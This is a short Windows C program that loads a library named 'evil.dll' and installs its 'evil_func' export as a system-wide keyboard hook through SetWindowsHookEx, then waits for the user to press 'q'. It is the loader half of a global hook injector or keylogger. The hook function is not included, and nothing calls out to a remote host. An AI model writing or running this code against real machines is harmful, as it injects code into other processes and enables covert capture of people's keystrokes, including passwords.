#include <windows.h>
#include <stdio.h>

int main( int argc, char* argv[] )
{
    HMODULE library = LoadLibrary("evil.dll");
    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "evil_func");
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0);
    char option;
    printf("Enter 'q' to exit\n");
    do
    {
        option = getchar ();
    }
    while (option != 'q');
}
